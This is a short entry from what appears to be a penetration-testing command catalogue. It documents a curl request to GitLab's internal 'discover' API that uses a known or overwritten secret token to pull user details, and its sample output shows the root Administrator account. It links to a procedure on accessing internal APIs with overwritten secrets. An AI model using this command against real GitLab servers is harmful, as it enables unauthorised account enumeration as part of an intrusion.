---
id: cmd-curl-internal-discover
data: >-
  curl -s
  'http://4290d4225642/api/v4/internal/discover?secret_token=███&user_id=1'
tags:
  - internal-api
  - discovery
type: command
output: '{"id":1,"name":"Administrator","username":"root"}'
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:08.755Z'
verified: false
validated: true
submitted: true
---
# curl-internal-discover

## Command

```bash
curl -s 'http://4290d4225642/api/v4/internal/discover?secret_token=███&user_id=1'
```

## Description

Quietly sends a request to the internal GitLab API to discover user details by ID using the secret token.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -s | Silent | Yes |
| secret_token=███ | Known token | Yes |
| user_id=1 | Target user | Yes |

## Examples

### Basic Usage

```bash
curl -s 'http://target/api/v4/internal/discover?secret_token=known&user_id=1'
```

## Expected Output

User JSON details.

## Related

- [[procedures/Access-Internal-APIs-with-Overwritten-Secrets]]
